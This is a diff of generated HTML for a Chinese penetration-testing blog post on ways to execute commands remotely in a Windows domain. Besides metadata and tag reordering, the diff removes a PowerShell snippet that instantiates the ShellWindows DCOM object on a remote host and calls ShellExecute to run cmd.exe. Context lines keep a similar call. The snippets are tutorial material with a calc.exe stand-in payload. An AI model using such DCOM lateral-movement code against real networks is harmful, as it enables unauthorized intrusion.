@@ -8,14 +8,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="与其临渊羡鱼，不如退而结网。">
 <meta property="og:type" content="website">
-<meta property="og:title" content="friends">
-<meta property="og:url" content="http://imysec.github.io/friends/index.html">
+<meta property="og:title" content="about">
+<meta property="og:url" content="http://imysec.github.io/about/index.html">
 <meta property="og:site_name" content="忆时光">
 <meta property="og:description" content="与其临渊羡鱼，不如退而结网。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-04-03T03:20:46.000Z">
+<meta property="og:updated_time" content="2019-04-03T02:55:22.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="friends">
+<meta name="twitter:title" content="about">
 <meta name="twitter:description" content="与其临渊羡鱼，不如退而结网。">
 
 
@@ -139,7 +139,7 @@
     
         
             
-            <li><div data-rel="工具">工具<small>(2)</small></div>
+            <li><div data-rel="漏洞复现">漏洞复现<small>(12)</small></div>
                 
             </li>
             
@@ -147,7 +147,7 @@
     
         
             
-            <li><div data-rel="漏洞复现">漏洞复现<small>(12)</small></div>
+            <li><div data-rel="工具">工具<small>(2)</small></div>
                 
             </li>
             
@@ -211,7 +211,7 @@
     
         
             
-            <li><div data-rel="提权">提权<small>(2)</small></div>
+            <li><div data-rel="读书笔记">读书笔记<small>(1)</small></div>
                 
             </li>
             
@@ -219,7 +219,7 @@
     
         
             
-            <li><div data-rel="读书笔记">读书笔记<small>(1)</small></div>
+            <li><div data-rel="提权">提权<small>(2)</small></div>
                 
             </li>
             
@@ -278,15 +278,15 @@
     <div class="tags-list">
     
     <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">漏洞复现</a>
+    </li>
+    
+    <li class="article-tag-list-item">
         <a href="javascript:" class="color4">web</a>
     </li>
     
     <li class="article-tag-list-item">
         <a href="javascript:" class="color5">渗透测试</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color5">漏洞复现</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -699,12 +699,12 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-10-18 12:44:12">2019-10-16 20:08</time>
+        创建时间:<time class="date" title="更新时间: 2019-10-18 12:52:53">2019-10-16 20:08</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:2.3k</span>
+        <span>字数:2.2k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -871,12 +871,6 @@ $item.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&qu
 </code></pre><p><img src="/2019/10/16/yu-shen-tou-yuan-cheng-zhi-xing-ming-ling-de-ji-chong-zi-shi/6.png" alt=""></p>
 <p><strong>注意：</strong></p>
 <p>以上两种方式适用于Win7-Win10</p>
-<p><strong>调用’C08AFD90-F2A1-11D1-8455-00A0C91F3880’</strong></p>
-<pre><code>$com = [Type]::GetTypeFromCLSID(&#39;C08AFD90-F2A1-11D1-8455-00A0C91F3880&#39;,&quot;192.168.0.2&quot;)
-$obj = [System.Activator]::CreateInstance($com)
-$obj.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)
-</code></pre><p><strong>注意：</strong></p>
-<p>该方法不适用于Win7，适用于Win10和Server2012 R2</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1395851238@qq.com </span>
@@ -891,10 +885,10 @@ $obj.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&quo
 
 <div class="article_copyright">
     <p><span class="copy-title">文章标题:</span>域渗透远程执行命令的几种姿势</p>
-    <p><span class="copy-title">文章字数:</span><span class="post-count">2.3k</span></p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">2.2k</span></p>
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="忆时光">忆时光</a></p>
     <p><span class="copy-title">发布时间:</span>2019-10-16, 20:08:41</p>
-    <p><span class="copy-title">最后更新:</span>2019-10-18, 12:44:12</p>
+    <p><span class="copy-title">最后更新:</span>2019-10-18, 12:52:53</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/10/16/yu-shen-tou-yuan-cheng-zhi-xing-ming-ling-de-ji-chong-zi-shi/" title="域渗透远程执行命令的几种姿势">http://imysec.github.io/2019/10/16/yu-shen-tou-yuan-cheng-zhi-xing-ming-ling-de-ji-chong-zi-shi/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
@@ -977,7 +971,7 @@ $obj.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&quo
     /*作者、标签的自动补全*/
     $(function () {
         $('.search').AutoComplete({
-            'data': ['#web','#渗透测试','#漏洞复现','#DVWA','#渗透','#Github','#Git','#HTTP','#ctf','#linux','#XSS','#docker','#PHP','#源码泄露','#php','#SQL注入','#提权','#域','#文件上传','#文件包含','#正则表达式','#内网渗透','#域渗透','#Web',],
+            'data': ['#漏洞复现','#web','#渗透测试','#DVWA','#渗透','#Github','#Git','#HTTP','#ctf','#linux','#XSS','#docker','#PHP','#源码泄露','#php','#SQL注入','#提权','#域','#文件上传','#文件包含','#正则表达式','#内网渗透','#域渗透','#Web',],
             'itemHeight': 20,
             'width': 418
         }).AutoComplete('show');
